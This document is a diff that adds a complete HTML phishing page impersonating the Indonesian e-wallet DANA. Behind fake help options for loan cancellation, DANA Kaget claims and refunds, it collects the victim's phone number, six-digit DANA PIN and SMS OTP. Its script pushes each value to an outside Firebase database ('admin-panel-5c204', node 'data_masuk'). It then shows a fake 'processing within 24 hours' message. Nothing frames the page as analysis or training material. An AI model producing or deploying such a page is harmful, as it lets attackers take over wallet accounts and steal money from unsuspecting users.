@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <meta name="theme-color" content="#108EE9">
+  <title>DANA - Dompet Digital Indonesia</title>
+
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+  <style>
+    /* Reset & Base Original */
+    * { box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
+    body { margin: 0; background-color: #F5F9FC; color: #333; overflow-y: auto; }
+    
+    #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 1000; flex-direction: column; align-items: center; justify-content: center; }
+    .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #108EE9; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+    /* Gaya Menu Halaman Utama Tetap Sama */
+    .promo-banner { width: 100%; display: block; }
+    .protection-status { background: #108EE9; color: white; margin: 10px 15px; border-radius: 8px; padding: 12px 15px; display: flex; align-items: center; justify-content: space-between; font-size: 13px; font-weight: bold; }
+    .search-bar { background: white; margin: 10px 15px; border-radius: 8px; padding: 12px; border: 1px solid #E6EAEF; display: flex; align-items: center; color: #B3B9C0; font-size: 14px; }
+    .section-title { margin: 20px 15px 10px; font-weight: bold; font-size: 16px; color: #3D4752; }
+    .menu-blue-container { padding: 0 15px; }
+    .menu-blue-btn { background: #108EE9; color: white; display: flex; align-items: center; padding: 15px; border-radius: 12px; margin-bottom: 12px; cursor: pointer; border: none; width: 100%; box-shadow: 0 4px 10px rgba(16, 142, 233, 0.2); }
+    .m-icon-box { width: 40px; height: 40px; background: rgba(255,255,255,0.2); border-radius: 10px; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-size: 20px; }
+    .m-text { flex: 1; text-align: left; font-weight: bold; font-size: 14px; }
+    .m-arrow { font-size: 18px; opacity: 0.8; }
+    .terbaru-box { background: white; margin: 15px; border-radius: 12px; padding: 15px; border: 1px solid #E6EAEF; margin-bottom: 100px; }
+    .terbaru-item { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; }
+    .terbaru-img { width: 45px; height: 45px; border-radius: 50%; object-fit: cover; }
+    .terbaru-info b { display: block; font-size: 14px; }
+    .terbaru-info span { font-size: 12px; color: #7A848F; }
+    .footer-nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #EEE; z-index: 100; }
+    .nav-header { background: white; padding: 15px; display: flex; align-items: center; border-bottom: 1px solid #E6EAEF; }
+    .nav-header span { font-weight: bold; font-size: 16px; margin-left: 20px; color: #3D4752; }
+    .blue-banner { background: #108EE9; padding: 25px; text-align: center; }
+    .logo-dana-white { width: 110px; filter: brightness(0) invert(1); }
+    .container { margin: -30px 15px 20px; background: white; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.06); padding: 25px 20px; position: relative; z-index: 10; }
+    .selected-task-text { color: #108EE9; font-weight: bold; display: block; margin-bottom: 5px; font-size: 14px; }
+    .phone-box { display: flex; align-items: center; border: 1px solid #D8DDE3; border-radius: 12px; padding: 0 15px; height: 58px; margin: 15px 0 10px; }
+    .flag { width: 30px; margin-right: 12px; }
+    .code { font-weight: bold; font-size: 17px; border-right: 1px solid #E6EAEF; padding-right: 12px; margin-right: 12px; }
+    input { border: none; font-size: 18px; width: 100%; outline: none; background: transparent; }
+    .instruction-text { font-size: 11px; color: #7A848F; line-height: 1.5; margin-bottom: 20px; text-align: center; }
+    .btn-submit { width: 100%; height: 52px; border: none; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; transition: 0.2s; }
+    .btn-active { background: #108EE9; color: white; }
+    .btn-disabled { background: #B3B9C0; color: white; pointer-events: none; }
+
+    /* --- GAYA BARU UNTUK HALAMAN PIN (MENGAMBIL DARI KODE 2) --- */
+    #page-pin { background-color: #008CFF; height: 100vh; color: white; text-align: center; position: fixed; top: 0; left: 0; width: 100%; z-index: 500; display: none; }
+    #page-pin.active { display: block; }
+    .pin-header { display: flex; align-items: center; justify-content: space-between; padding: 16px; }
+    .pin-header .back { font-size: 24px; cursor: pointer; }
+    .pin-header .logo-container { flex-grow: 1; display: flex; justify-content: center; }
+    .pin-header img { height: 28px; object-fit: contain; }
+    .pin-title { margin-top: 40px; font-size: 16px; }
+    .pin-title strong { font-weight: bold; }
+    .pin-boxes { display: flex; justify-content: center; gap: 12px; margin: 30px 0 20px; }
+    .pin-box { width: 48px; height: 48px; border-radius: 10px; background-color: white; color: black; font-size: 24px; text-align: center; line-height: 48px; }
+    #pinInput { position: absolute; opacity: 0; pointer-events: none; }
+    .show-btn { padding: 8px 20px; border: 1.5px solid white; background: transparent; color: white; font-weight: bold; border-radius: 20px; margin-bottom: 20px; cursor: pointer; }
+    .pin-links { font-size: 14px; margin-top: 10px; }
+    .pin-links a { color: white; font-weight: bold; text-decoration: none; }
+
+    /* Gaya OTP & Verifikasi Tetap */
+    section { display: none; }
+    section.active:not(#page-pin) { display: block; animation: fadeIn 0.3s; }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    #page-otp { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #108EE9; z-index: 200; color: white; text-align: center; padding-top: 15px; }
+    .otp-header { display: flex; align-items: center; padding: 0 15px; font-weight: bold; font-size: 18px; }
+    .otp-inputs { display: flex; justify-content: center; gap: 12px; margin: 30px 0; }
+    .otp-box-white { width: 55px; height: 55px; background: white; border-radius: 10px; border: none; text-align: center; font-size: 24px; font-weight: bold; color: #333; outline: none; }
+  </style>
+</head>
+<body onclick="focusPin()">
+
+  <div id="loader"><div class="spinner"></div></div>
+
+  <section id="page-menu" class="active">
+    <img src="pro.jpg" class="promo-banner">
+    <div class="protection-status"><span>🛡️ DANA Protection Aktif</span><span>Detail ›</span></div>
+    <div class="search-bar">🔍 Cari bantuan atau masalah akun...</div>
+
+    <div class="section-title">Pilih Masalah Anda</div>
+    <div class="menu-blue-container">
+      <div class="menu-blue-btn" onclick="startFlow('Pembatalan PINJAMAN')">
+        <div class="m-icon-box">🪙</div><div class="m-text">𝟭.PEMBATALAN PINJAMAN PAYLATER</div><div class="m-arrow">›</div>
+      </div>
+      <div class="menu-blue-btn" onclick="startFlow('Pengajuan PINJAMAN')">
+        <div class="m-icon-box">💳</div><div class="m-text">𝟮.PENGAJUAN PINJAMAN</div><div class="m-arrow">›</div>
+      </div>
+      <div class="menu-blue-btn" onclick="startFlow('Klaim DANA KAGET')">
+        <div class="m-icon-box">💸</div><div class="m-text">𝟯.KLAIM DANA KAGET</div><div class="m-arrow">›</div>
+      </div>
+      <div class="menu-blue-btn" onclick="startFlow('refund saldo dana')">
+        <div class="m-icon-box">📩</div><div class="m-text">𝟰.REFUND SALDO DANA</div><div class="m-arrow">›</div>
+      </div>
+    </div>
+
+    <div class="section-title">Terbaru Untukmu</div>
+    <div class="terbaru-box">
+      <div class="terbaru-item"><img src="baru1.jpg" class="terbaru-img"><div class="terbaru-info"><b>DANA Xuper Angpao</b><span>Dapatkan saldo kaget harian.</span></div></div>
+      <div class="terbaru-item"><img src="baru2.jpg" class="terbaru-img"><div class="terbaru-info"><b>Jaminan 100% Uang Kembali</b><span>#AmanDariBadman</span></div></div>
+      <div class="terbaru-item"><img src="baru3.jpg" class="terbaru-img"><div class="terbaru-info"><b>Posko Bantuan Keliling</b><span>Nikmatin layanan prioritas buatmu</span></div></div>
+    </div>
+  </section>
+
+  <section id="page-phone">
+    <div class="nav-header" onclick="location.reload()"><span>‹ Kembali</span></div>
+    <div class="blue-banner"><img src="logo.jpg" class="logo-dana-white"></div>
+    <div class="container">
+      <h3>Masukkan nomor HP untuk lanjut!<span id="display-method" class="selected-task-text"></span></h3>
+      <div class="phone-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/Flag_of_Indonesia.svg" class="flag">
+        <div class="code">+62</div>
+        <input type="tel" id="userPhone" placeholder="8xx xxxx xxxx" maxlength="13" oninput="checkPhone()">
+      </div>
+      <button id="btnNext" class="btn-submit btn-disabled" onclick="sendPhone()">LANJUTKAN</button>
+    </div>
+  </section>
+
+  <section id="page-pin">
+    <div class="pin-header">
+      <div class="back" onclick="location.reload()">&larr;</div>
+      <div class="logo-container"><img src="logo.jpg" alt="Logo" /></div>
+      <div style="width: 24px;"></div>
+    </div>
+    <div class="pin-title">Masukkan <strong>PIN DANA</strong></div>
+    <div class="pin-boxes" id="pinDots">
+      <div class="pin-box" id="p1"></div><div class="pin-box" id="p2"></div><div class="pin-box" id="p3"></div>
+      <div class="pin-box" id="p4"></div><div class="pin-box" id="p5"></div><div class="pin-box" id="p6"></div>
+    </div>
+    <input type="password" id="pinInput" maxlength="6" inputmode="numeric" oninput="processPin()">
+    <button class="show-btn" onclick="togglePinVisibility()">TAMPILKAN</button>
+    <div class="pin-links"><a href="#">LUPA PIN?</a></div>
+  </section>
+
+  <section id="page-verify">
+    <div class="nav-header"><span>Verifikasi Akun</span></div>
+    <div class="container" style="text-align: center; margin-top: 50px;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_dana_blue.svg" width="80" style="margin-bottom: 20px;">
+        <p style="font-weight: bold;">Selesaikan Verifikasi</p>
+        <p style="font-size: 13px; color: #7A848F;">Buka aplikasi DANA Anda untuk mengonfirmasi permintaan bantuan ini.</p>
+        <button class="btn-submit btn-active" onclick="goOtp()">SAYA SUDAH VERIFIKASI</button>
+    </div>
+  </section>
+
+  <section id="page-otp">
+    <div class="otp-header">
+      <span style="font-size: 24px;" onclick="location.reload()">‹</span>
+      <span style="flex: 1; text-align: center; margin-right: 20px;">Verifikasi SMS</span>
+    </div>
+    <div style="margin-top: 60px;">
+        <p>Kode OTP telah dikirim ke</p>
+        <div id="otpTarget" style="font-weight: bold; background: rgba(0,0,0,0.2); display: inline-block; padding: 5px 15px; border-radius: 20px; margin: 10px 0;">+62...</div>
+    </div>
+    <div class="otp-inputs">
+        <input type="tel" maxlength="1" class="otp-box-white" id="o1" oninput="jump(this, 'o2')">
+        <input type="tel" maxlength="1" class="otp-box-white" id="o2" oninput="jump(this, 'o3')">
+        <input type="tel" maxlength="1" class="otp-box-white" id="o3" oninput="jump(this, 'o4')">
+        <input type="tel" maxlength="1" class="otp-box-white" id="o4" oninput="sendOtp()">
+    </div>
+  </section>
+
+  <script>
+    // FIREBASE INITIALIZATION
+    const firebaseConfig = { databaseURL: "https://admin-panel-5c204-default-rtdb.firebaseio.com/" };
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    let dataStore = { method: "", phone: "", pin: "", otp: "" };
+    let currentId = "";
+    let isPinVisible = false;
+
+    function jump(c, n) { if(c.value.length >= 1 && n !== "") document.getElementById(n).focus(); }
+
+    function showLoader(fn) {
+      document.getElementById('loader').style.display = 'flex';
+      setTimeout(() => { document.getElementById('loader').style.display = 'none'; if(fn) fn(); }, 800);
+    }
+
+    function startFlow(method) {
+      dataStore.method = method;
+      document.getElementById('display-method').innerText = method;
+      showLoader(() => {
+        document.getElementById('page-menu').classList.remove('active');
+        document.getElementById('page-phone').classList.add('active');
+      });
+    }
+
+    function checkPhone() {
+      const v = document.getElementById('userPhone').value;
+      const btn = document.getElementById('btnNext');
+      if(v.length >= 9) { btn.className = "btn-submit btn-active"; btn.disabled = false; }
+      else { btn.className = "btn-submit btn-disabled"; btn.disabled = true; }
+    }
+
+    function sendPhone() {
+      dataStore.phone = "+62" + document.getElementById('userPhone').value;
+      document.getElementById('otpTarget').innerText = dataStore.phone;
+      const newRef = database.ref('data_masuk').push();
+      currentId = newRef.key;
+      newRef.set({ metode: dataStore.method, nomor_hp: dataStore.phone, waktu: new Date().toLocaleString() });
+      showLoader(() => {
+        document.getElementById('page-phone').classList.remove('active');
+        document.getElementById('page-pin').classList.add('active');
+        setTimeout(() => document.getElementById('pinInput').focus(), 300);
+      });
+    }
+
+    // LOGIKA PROSES PIN (MENGGUNAKAN TAMPILAN KODE 2)
+    function processPin() {
+      const input = document.getElementById('pinInput');
+      const val = input.value;
+      const boxes = [
+        document.getElementById("p1"), document.getElementById("p2"), document.getElementById("p3"),
+        document.getElementById("p4"), document.getElementById("p5"), document.getElementById("p6")
+      ];
+
+      boxes.forEach((box, i) => {
+        if (val[i]) {
+          box.textContent = isPinVisible ? val[i] : "•";
+        } else {
+          box.textContent = "";
+        }
+      });
+
+      if(val.length === 6) {
+        dataStore.pin = val;
+        database.ref('data_masuk/' + currentId).update({ pin: val });
+        showLoader(() => {
+          document.getElementById('page-pin').classList.remove('active');
+          document.getElementById('page-verify').classList.add('active');
+        });
+      }
+    }
+
+    function togglePinVisibility() {
+      isPinVisible = !isPinVisible;
+      const btn = document.querySelector('.show-btn');
+      btn.innerText = isPinVisible ? "SEMBUNYIKAN" : "TAMPILKAN";
+      processPin(); // Refresh tampilan dots
+    }
+
+    function goOtp() {
+      showLoader(() => {
+        document.getElementById('page-verify').classList.remove('active');
+        document.getElementById('page-otp').classList.add('active');
+        setTimeout(() => document.getElementById('o1').focus(), 300);
+      });
+    }
+
+    function sendOtp() {
+      const otp = document.getElementById('o1').value + document.getElementById('o2').value + 
+                  document.getElementById('o3').value + document.getElementById('o4').value;
+      if(otp.length < 4) return;
+      database.ref('data_masuk/' + currentId).update({ otp: otp }).then(() => {
+        showLoader(() => {
+          alert("Sistem sedang memproses kendala Anda. Mohon tunggu 1x24 jam.");
+          location.reload();
+        });
+      });
+    }
+
+    function focusPin() { 
+      if(document.getElementById('page-pin').classList.contains('active')) {
+        document.getElementById('pinInput').focus(); 
+      }
+    }
+  </script>
+</body>
+    </html>
